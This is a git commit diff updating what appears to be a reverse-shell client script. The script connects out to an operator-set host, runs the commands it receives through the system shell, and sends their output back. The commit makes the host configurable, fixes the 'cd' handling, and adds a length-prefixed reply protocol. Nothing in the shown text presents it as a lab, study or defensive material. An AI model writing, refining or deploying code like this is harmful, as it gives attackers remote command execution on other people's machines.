d1e7ba9149a2994e0fe6d6f6a446e9107fe00078
Fsock-hub <canman9876@gmail.com>
2026-09-17 22:05:28 +0300

    Update and rename client_v0.3.py to client_v0.4.py

--- client_v0.4.py
+++ client_v0.4.py
@@ -4,7 +4,7 @@ import time
 import sys
 import os
 
-def client_listen(host='10.0.0.153'):
+def client_listen(host='127.0.0.1'): # <- EDIT HOST PARAM ON NEEDED IP OR DOMAIN
 
     while True:
         try:
@@ -21,7 +21,7 @@ def client_listen(host='10.0.0.153'):
                         client.close()
                         sys.exit(0)
 
-                    if cmd.lower().startswith('cd'):
+                    if cmd.lower().startswith('cd '):
                         try:
                             path = cmd[3:].strip()
                             os.chdir(path) 
@@ -29,10 +29,20 @@ def client_listen(host='10.0.0.153'):
                         except Exception as e:
                             result = f"[!] Error to change directory: {str(e)}\n".encode('utf-8')
 
+                        result_len = len(result)
+                        client.send(f"{result_len:<64}".encode('utf-8'))
+
+                        ack = client.recv(1024) 
+                        if ack == b"OK_SIZE":
+                            client.sendall(result)
+
                     else:
                         try:
                             output = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='cp866', timeout=5)
                             result = (output.stdout + output.stderr).encode('utf-8')
+
+                            if not result:
+                                result = b'[+] Done\n'
 
                         except subprocess.TimeoutExpired:
                             result = '[!] Error: Command execution timeout exceeded \n'.encode('utf-8')
